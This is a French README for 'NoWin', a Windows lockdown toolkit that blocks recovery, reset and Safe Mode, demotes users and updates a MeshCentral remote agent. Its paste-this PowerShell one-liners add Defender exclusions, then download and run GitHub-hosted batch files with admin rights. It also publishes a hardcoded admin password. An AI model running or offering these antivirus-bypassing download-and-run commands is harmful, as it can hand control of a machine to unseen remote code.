# NoWin - System Lockdown Suite v2.3

> Toolkit de restriction système Windows pour environnements gérés.

📖 [Documentation détaillée](DOCS.md)

---

## 🔒 Lockdown (Verrouillage Système)
Bloque WinRE, réinitialisation, Safe Mode, USB boot, WiFi disconnect.
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Lockdown.bat" -OutFile "$p\Lockdown.bat"; Start-Process "$p\Lockdown.bat" -ArgumentList "--yes" -Verb RunAs
```

## 🔓 Unlock (Déverrouillage)
Restaure toutes les fonctionnalités bloquées par Lockdown.
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Unlock.bat" -OutFile "$p\Unlock.bat"; Start-Process "$p\Unlock.bat" -ArgumentList "--yes" -Verb RunAs
```

## ✅ Verify (Vérification)
Affiche un rapport complet de l'état de sécurité.
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Verify.bat" -OutFile "$p\Verify.bat"; Start-Process "$p\Verify.bat" -ArgumentList "--yes" -Verb RunAs
```

## 👤 UserLock (Restriction Utilisateur)
Passe l'utilisateur en standard, installe le **Lanceur Admin** sur le bureau.
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UserLock.bat" -OutFile "$p\UserLock.bat"; Start-Process "$p\UserLock.bat" -ArgumentList "--yes" -Verb RunAs
```

## 👤 UserUnlock (Restauration Utilisateur)
Restaure les droits admin, supprime le Lanceur Admin.
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UserUnlock.bat" -OutFile "$p\UserUnlock.bat"; Start-Process "$p\UserUnlock.bat" -ArgumentList "--yes" -Verb RunAs
```

## 🔄 Force Update Agent (MeshCentral)
Met à jour l'agent MeshCentral.
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat" -OutFile "$p\force-update-agent.bat"; Start-Process "$p\force-update-agent.bat" -ArgumentList "--yes" -Verb RunAs
```

---

## 📥 Télécharger Tout
```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; $b="https://raw.githubusercontent.com/LightZirconite/NoWin/main"
New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
@("Lockdown.bat","Unlock.bat","Verify.bat","UserLock.bat","UserUnlock.bat","AdminLauncher.bat","force-update-agent.bat")|%{Invoke-WebRequest -UseBasicParsing "$b/$_" -OutFile "$p\$_"; Write-Host "OK: $_" -ForegroundColor Green}
```

---

## ⚙️ Notes importantes

**Pour réappliquer après modifications :**
1. Exécutez d'abord **Unlock** (ou **UserUnlock**)
2. Puis exécutez **Lockdown** (ou **UserLock**)

Les scripts ne nettoient pas automatiquement les anciennes configurations.

---

## 🚀 Lanceur Admin

Quand **UserLock** est exécuté, un raccourci **"Lanceur Admin"** est créé sur le bureau.

Ce lanceur permet à l'admin d'ouvrir les applications bloquées :
- Panneau de configuration
- Gestionnaire des tâches
- Éditeur de registre
- Connexions réseau
- PowerShell / CMD (Admin)
- Et plus...

L'admin sélectionne une app → entre le mot de passe → l'app s'ouvre.

---

## 🛠️ Commandes d'installation / désinstallation

Si vous avez besoin d'installer ou de désinstaller manuellement `AdminLauncher`, utilisez les commandes PowerShell suivantes (exécutées en tant qu'administrateur).

- Désinstaller `AdminLauncher` (élévation requise) :

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UninstallAdmin.bat" -OutFile "$p\UninstallAdmin.bat"; Start-Process "$p\UninstallAdmin.bat" -Verb RunAs
```

- Installer `AdminLauncher` (exécute le mode `--install` avec élévation) :

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/AdminLauncher.bat" -OutFile "$p\AdminLauncher.bat"; Start-Process "$p\AdminLauncher.bat" -ArgumentList "--install" -Verb RunAs
```


**⚠️ Exécuter PowerShell en Administrateur** | **🔑 Mot de passe Admin:** `uyy`
